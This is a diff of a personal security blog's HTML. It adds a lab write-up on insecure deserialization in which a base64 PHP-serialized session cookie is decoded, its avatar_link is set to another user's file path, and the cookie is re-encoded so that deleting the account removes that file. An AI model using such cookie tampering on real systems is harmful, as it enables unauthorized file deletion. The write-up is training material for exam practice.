@@ -41,6 +41,10 @@
         <a href="/" id="logo">Grey Zone</a>
       </h1>
       
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Offsec, Game Design and More</a>
+        </h2>
+      
     </div>
     <div id="header-inner" class="inner">
       <nav id="main-nav">
@@ -66,6 +70,74 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Web-Security-Academy-Java-deserialization" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/07/07/Web-Security-Academy-Java-deserialization/" class="article-date">
+  <time datetime="2020-07-07T08:09:35.000Z" itemprop="datePublished">2020-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/07/Web-Security-Academy-Java-deserialization/">[Web Security Academy] Insecure Deserialization (1)</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>(Lab 1 and 2 are skipped because the contents are easy. The main purpose for this practice is to prepare myself for OSWE exam.)</p>
+<h1 id="Lab-3-Using-application-functionality-to-exploit-insecure-deserialization"><a href="#Lab-3-Using-application-functionality-to-exploit-insecure-deserialization" class="headerlink" title="Lab 3: Using application functionality to exploit insecure deserialization"></a>Lab 3: Using application functionality to exploit insecure deserialization</h1><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><blockquote>
+<p>This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the morale.txt file from Carlos’s home directory.<br>You can access your own account using the following credentials: wiener:peter<br>You also have access to a backup account: gregg:rosebud</p>
+</blockquote>
+<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol>
+<li><p>Notice that “My Account” Page Cookie after login:</p>
+<blockquote>
+<p>Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJOWDVsc21ucVI5TWZTb2wwQVZIRTRRbU40R3lsYW9yZSI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d</p>
+</blockquote>
+</li>
+<li><p>Decode the base64 cookie:</p>
+</li>
+</ol>
+<blockquote>
+<p>O:4:”User”:3:{s:8:”username”;s:6:”wiener”;s:12:”access_token”;s:32:”NX5lsmnqR9MfSol0AVHE4QmN4Gylaore”;s:11:”avatar_link”;s:19:”users/wiener/avatar”O30%3d</p>
+</blockquote>
+<p>Take note that <strong>avatar_link</strong> is referred in the cookie. Meanwhile, <strong>Delete Account</strong> button sends a post request to delete the current account. To delete the morale.txt file from Carlo’s home directory, it is clear that crafting the cookie and delete the account is one possible way.</p>
+<ol start="3">
+<li>Craft the cookie:</li>
+</ol>
+<blockquote>
+<p>O:4:”User”:3:{s:8:”username”;s:5:”gregg”;s:12:”access_token”;s:32:”OsTWRNgOgwIgdfjwDk6SgFT5iKZTbHx8”;s:11:”avatar_link”;<strong>s:23:”/home/carlos/morale.txt”</strong>;}</p>
+</blockquote>
+<p>Encode it with base64:</p>
+<blockquote>
+<p>Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjU6ImdyZWdnIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6Ik9zVFdSTmdPZ3dJZ2RmandEazZTZ0ZUNWlLWlRiSHg4IjtzOjExOiJhdmF0YXJfbGluayI7czoyMzoiL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO30=</p>
+</blockquote>
+<ol start="4">
+<li>Replace the cookie with the crafted one when delete the account.</li>
+</ol>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/07/07/Web-Security-Academy-Java-deserialization/" data-id="ckcd03koz0000goutf3cq5dci" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-HTB-Walkthrough-Blunder" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2020/07/04/HTB-Walkthrough-Blunder/" class="article-date">
@@ -80,7 +152,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Walkthrough] Blunder</a>
+      <a class="article-title" href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Hints] Blunder</a>
     </h1>
   
 
@@ -105,6 +177,8 @@
       <a data-url="http://yoursite.com/2020/07/04/HTB-Walkthrough-Blunder/" data-id="ckc73bb830001vout0c491pu1" class="article-share-link">Share</a>
       
       
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HTB-Offsec/" rel="tag">HTB, Offsec</a></li></ul>
+
     </footer>
   </div>
   
@@ -171,9 +245,23 @@
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/HTB-Offsec/" rel="tag">HTB, Offsec</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Offsec/" rel="tag">Offsec</a></li></ul>
+    </div>
+  </div>
+
 
   
     
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/HTB-Offsec/" style="font-size: 10px;">HTB, Offsec</a> <a href="/tags/Offsec/" style="font-size: 10px;">Offsec</a>
+    </div>
+  </div>
+
   
     
   <div class="widget-wrap">
@@ -192,7 +280,11 @@
       <ul>
         
           <li>
-            <a href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Walkthrough] Blunder</a>
+            <a href="/2020/07/07/Web-Security-Academy-Java-deserialization/">[Web Security Academy] Insecure Deserialization (1)</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/04/HTB-Walkthrough-Blunder/">[HTB Hints] Blunder</a>
           </li>
         
           <li>
